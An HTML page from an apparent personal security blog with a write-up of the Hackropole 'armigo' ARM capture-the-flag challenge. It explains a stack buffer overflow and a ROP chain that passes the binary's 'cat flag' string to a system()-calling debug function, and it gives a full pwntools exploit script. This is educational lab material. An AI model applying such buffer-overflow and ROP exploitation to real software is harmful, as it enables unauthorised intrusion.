<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>0xb0tm4n&#x27;s website</title>
  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"
    integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous" defer></script>
  <script src="/js/index.js" defer></script>
  <script src="/js/prompt.js" defer></script>
  <script src="/js/keyboard.js" defer></script>
  <script src="/js/tab.js" defer></script>
  <script src="/js/commands.js" defer></script>
  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head><body onkeydown='exec(event)' style='background-image: url("/assets/background.jpg");'><main>
      <div class="files" id="files" tabindex="0">
<ul>
  <li class="file">
    <span><a href='https://super-botman.github.io/readme/'
      tabindex="0">  README</a></span>
  </li>

<li class="folder"><span>
      <a href='https://super-botman.github.io/pwn/'
        tabindex="0">  Pwn
      </a>
    </span>

    <ul>
      
      
        
        
          
<li>
<span>└──
  <a href='https://super-botman.github.io/pwn/writeups/'
    tabindex="0">  Writeups
  </a>
</span>


  <ul>

  
  <li class="file">
    <span>└──
      <a href='https://super-botman.github.io/pwn/writeups/robot/'
        tabindex="0">  FCSC 2023 | Robot</a>
    </span>
  </li><li class="file">
    <span>└──
      <a href='https://super-botman.github.io/pwn/writeups/bigorneau/'
        tabindex="0">  FCSC 2025 | Bigorneau</a>
    </span>
  </li><li class="file">
    <span>└──
      <a href='https://super-botman.github.io/pwn/writeups/http3/'
        tabindex="0">  FCSC 2025 | HTTP3</a>
    </span>
  </li><li class="file">
    <span>└──
      <a href='https://super-botman.github.io/pwn/writeups/small-prime-shellcode/'
        tabindex="0">  FCSC 2025 | Small Prime Shellcode</a>
    </span>
  </li><li class="file">
    <span>└──
      <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
        tabindex="0">  Hackropole | Aarchibald</a>
    </span>
  </li><li class="file">
    <span>└──
      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
        tabindex="0">  Hackropole | Alfred</a>
    </span>
  </li><li class="file">
    <span>└──
      <a class="selected"href='https://super-botman.github.io/pwn/writeups/armigo/'
        tabindex="0">  Hackropole | Armigo</a>
    </span>
  </li><li class="file">
    <span>└──
      <a href='https://super-botman.github.io/pwn/writeups/pwn103/'
        tabindex="0">  THM | pwn101 task 103</a>
    </span>
  </li></ul>
</li>

        
    </ul>
  </li><li class="folder"><span>
      <a href='https://super-botman.github.io/web/'
        tabindex="0">  Web
      </a>
    </span>

    <ul>
      
      
        
        
          
<li>
<span>└──
  <a href='https://super-botman.github.io/web/writeups/'
    tabindex="0">  Writeups
  </a>
</span>


  <ul>

  
  <li class="file">
    <span>└──
      <a href='https://super-botman.github.io/web/writeups/boiler/'
        tabindex="0">  THM | Boiler</a>
    </span>
  </li><li class="file">
    <span>└──
      <a href='https://super-botman.github.io/web/writeups/thomghost/'
        tabindex="0">  THM | Thomghost</a>
    </span>
  </li></ul>
</li>

        
    </ul>
  </li>
</ul>
</div>
      <div class="viewer page" id="viewer" tabindex="0">
        <div class="tab">
<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
<ul id="tabs">
</ul>


</div>
        <div class="content" id="content"><h1 id="pwn-armigo-hackropole">[Pwn] armigo | hackropole</h1>
<ul>
<li><a href="https://super-botman.github.io/pwn/writeups/armigo/#checksec">1. Checksec</a></li>
<li><a href="https://super-botman.github.io/pwn/writeups/armigo/#writeup">2. Writeup</a></li>
<li><a href="https://super-botman.github.io/pwn/writeups/armigo/#full-exploit">3. Full exploit</a></li>
</ul>
<h2 id="checksec">Checksec</h2>
<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">[*] </span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">/home/botman/Documents/cybersec/CTF/solo/hackropole/pwn/armigo/armigo</span><span style="color:#89ddff;">&#39;
</span><span>    </span><span style="color:#7aa2f7;">Arch:     arm-32-little
</span><span>    </span><span style="color:#7aa2f7;">RELRO:    Partial RELRO
</span><span>    </span><span style="color:#7aa2f7;">Stack:    No canary found
</span><span>    </span><span style="color:#7aa2f7;">NX:       NX enabled
</span><span>    </span><span style="color:#7aa2f7;">PIE:      No PIE (0x10000</span><span>)
</span></code></pre>
<h2 id="writeup">Writeup</h2>
<p>So this is yet another ARM pwn challenge !
We begin by open the binary in ghidra and check the main function, firstly we see a bof and then we can see another interesting function called "debug", this one is interesting becauseit's look like it's run some shell commands</p>
<p><img src="/images/armigo/main.png" alt="main" /></p>
<p>So now we can look into debug and yes! it's take the first argument and run system with it</p>
<p><img src="/images/armigo/debug.png" alt="debug" /></p>
<p>Ok, cool but how can we use this command to get the flag ?
We can going to build a really easy ROP with a pop r0 with a command like "/bin/bash" or "cat flag" and then ret to debug no ?
Firstly we're gonna check i there is some string who can help us and yes, we can find the string "cat flag" at the address <em>0x000733fc</em></p>
<p><img src="/images/armigo/cat_flag.png" alt="cat flag" /></p>
<p>Ok, so we just have to find a pop instruction and this should be easy because we have a big binary, and yes, it was easy</p>
<p><img src="/images/armigo/pop.png" alt="pop" /></p>
<p>So, i'm gonna summarize, we have:</p>
<ul>
<li>a pop instruction</li>
<li>a "cat flag" string</li>
<li>a debug function who run our shell command</li>
</ul>
<p>so we're juste gonna build our rop like this:</p>
<pre data-lang="exploit" style="background-color:#1a1b26;color:#c0caf5;" class="language-exploit "><code class="language-exploit" data-lang="exploit"><span>padding + pop + cat_flag + debug
</span></code></pre>
<p>this will pop r0 and lr (which is the "parente return address") and then put "cat flag" in r0 and debug addr in lr, after this there is a "bx lr" instruction which will jmp to our addr.</p>
<p>and here we go, we got the flag</p>
<p><img src="/images/armigo/flag.png" alt="flag" /></p>
<h2 id="full-exploit">Full exploit</h2>
<pre data-lang="python" style="background-color:#1a1b26;color:#c0caf5;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#7dcfff;">from </span><span>pwn </span><span style="color:#7dcfff;">import </span><span style="color:#ff9e64;">*
</span><span>
</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">exploit</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">elf</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">libc</span><span style="color:#89ddff;">=</span><span style="color:#ff9e64;">None</span><span style="color:#9abdf5;">):
</span><span>    padding </span><span style="color:#89ddff;">= </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">A</span><span style="color:#89ddff;">&quot;*</span><span style="color:#ff9e64;">68 
</span><span>    pop </span><span style="color:#89ddff;">= 0x</span><span style="color:#ff9e64;">000703c8 </span><span style="font-style:italic;color:#565f89;"># pop {r0, lr}; bx lr;
</span><span>    cat_flag </span><span style="color:#89ddff;">= 0x</span><span style="color:#ff9e64;">000733fc </span><span style="font-style:italic;color:#565f89;"># &quot;cat flag&quot;
</span><span>    debug </span><span style="color:#89ddff;">= 0x</span><span style="color:#ff9e64;">000104d8
</span><span>
</span><span>    payload </span><span style="color:#89ddff;">= </span><span>padding </span><span style="color:#89ddff;">+ </span><span style="color:#7aa2f7;">p32</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">pop</span><span style="color:#9abdf5;">) </span><span style="color:#89ddff;">+ </span><span style="color:#7aa2f7;">p32</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">cat_flag</span><span style="color:#9abdf5;">) </span><span style="color:#89ddff;">+ </span><span style="color:#7aa2f7;">p32</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">debug</span><span style="color:#9abdf5;">)
</span><span>
</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendlineafter</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">?</span><span style="color:#89ddff;">\n&#39;, </span><span style="color:#7aa2f7;">payload</span><span style="color:#9abdf5;">)
</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
</span><span>    flag </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">decode</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">utf-8</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">success</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">f</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">flag: </span><span style="color:#9abdf5;">{</span><span style="color:#7aa2f7;">flag</span><span style="color:#9abdf5;">}</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
</span><span>
</span></code></pre>
<p><a href="/exploits/armigo.py">download here</a></p>
<p><strong>Writed by 0xB0tm4n</strong></p>

        </div>
      </div>
      <div class="prompt" id="terminal"><input
    type="text"
    id="setter"
    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
    onchange="writeit(this, event)"
    onkeyup="writeit(this, event)"
    onkeypress="writeit(this, event);"
    >
<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
    </main>
  </body>

</html>
